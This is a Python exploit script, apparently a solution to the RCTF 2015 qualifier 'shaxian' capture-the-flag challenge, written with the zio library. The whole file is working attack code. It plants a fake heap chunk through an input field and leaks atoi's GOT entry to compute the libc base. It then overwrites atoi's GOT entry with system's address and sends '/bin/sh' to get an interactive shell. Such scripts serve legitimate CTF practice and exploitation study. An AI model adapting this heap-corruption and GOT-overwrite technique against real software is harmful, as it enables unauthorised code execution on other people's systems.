from zio import *

target          = './rctf-qual-2015-shaxian_51f320b11793463ecdcfbb0c015cc273'
c_read          = COLORED(RAW, 'blue')
c_write         = COLORED(RAW, 'green')
io              = zio(target, print_read = c_read, print_write = c_write)

got_atoi        = 0x804b038
offset_atoi     = 0x31860
offset_system   = 0x40190

io.gdb_hint([0x8048953])

def order(num, content):
    io.read_until('choose:')
    io.writeline('1')

    io.read_until('5.Jianjiao')
    io.writeline(content)

    io.read_until('How many?')
    io.writeline(num)

def submit():
    io.read_until('choose:')
    io.writeline('2')

def review():
    io.read_until('choose:')
    io.writeline('4')

# fake_chunk @ 0x804b1b8
fake_chunk  = l32(0x0) + l32(0x31) 

# message
io.read_until('Your Address:')
io.writeline('xdsec')
io.read_until('Your Phone number:')
io.writeline('a'*(0x100-16) + fake_chunk)

# leak
order(content = ('a'*0x20 + l32(got_atoi)), num = '0')
review()
io.read_until('-')
libc_base   = int('-' + io.readline()[0:-1]) + 0x100000000 - offset_atoi
adr_system  = libc_base + offset_system

# arbitrary write
order(content = ('a'*0x20 + l32(0x804b1b8)), num = l32(0))
submit()
order(content = (l32(0) + l32(got_atoi)) , num = str(adr_system - 0x100000000))

# get_shell
io.writeline('/bin/sh')
io.interact()
